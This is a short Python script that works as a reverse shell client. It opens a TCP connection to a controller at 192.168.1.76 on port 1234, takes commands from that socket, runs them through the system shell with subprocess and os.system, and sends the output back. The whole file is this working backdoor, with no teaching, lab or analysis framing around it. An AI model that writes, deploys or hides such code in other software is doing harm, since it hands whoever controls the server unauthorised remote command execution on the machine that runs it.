import socket
import subprocess
import os

server = "192.168.1.76"  # the server to communicate with
port = 1234  # the port to connect to

mysoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mysoc.connect((server, port))

cmd = ["cd"]

while True:
    command = mysoc.recv(1024).decode('utf-8').strip()  # Receive and strip whitespace

    # Check if the command does not include any of the words in the cmd list
    if not any(word in command for word in cmd):
        # Execute the command
        output = subprocess.check_output(command, shell=True)

        # Convert the bytes to string
        output = output.decode("utf-8")

        mysoc.send(output.encode('utf-8'))
    else:
        os.system(command)
        mysoc.send("sorry!".encode("utf-8"))
